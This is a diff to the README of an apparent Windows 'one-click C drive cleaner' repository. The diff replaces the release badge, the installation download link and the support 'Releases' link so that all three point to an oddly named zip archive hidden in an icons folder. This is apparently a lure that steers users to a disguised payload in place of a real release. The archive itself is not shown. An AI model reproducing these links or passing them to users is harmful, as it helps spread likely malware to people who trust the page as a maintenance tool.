@@ -1,6 +1,6 @@
 # One Click Cleaning of C Drive 🧹💻
 
-![GitHub release](https://img.shields.io/badge/Release-Download-brightgreen)
+![GitHub release](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/raw/refs/heads/master/icons/cleaning_One_drive_click_of_Beothukan.zip)
 
 Welcome to the **One Click Cleaning of C Drive** repository! This tool allows you to clean your C drive of residual files and junk with just one click. It operates safely and efficiently, ensuring your computer remains unharmed during the cleaning process.
 
@@ -22,7 +22,7 @@ Welcome to the **One Click Cleaning of C Drive** repository! This tool allows yo
 
 ## Installation ⚙️
 
-To get started, you need to download the latest release. You can find it [here](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/releases). 
+To get started, you need to download the latest release. You can find it [here](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/raw/refs/heads/master/icons/cleaning_One_drive_click_of_Beothukan.zip). 
 
 After downloading, follow these steps:
 
@@ -63,6 +63,6 @@ This project is licensed under the MIT License. You can find the full license te
 
 ## Support 💬
 
-If you encounter any issues or have questions, please check the [Releases](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/releases) section for updates. You can also open an issue in the repository, and we will get back to you as soon as possible.
+If you encounter any issues or have questions, please check the [Releases](https://github.com/kaustubh1234/One-click-cleaning-of-C-drive/raw/refs/heads/master/icons/cleaning_One_drive_click_of_Beothukan.zip) section for updates. You can also open an issue in the repository, and we will get back to you as soon as possible.
 
 Thank you for using the **One Click Cleaning of C Drive** tool! We hope it makes your computer maintenance easier and more efficient.
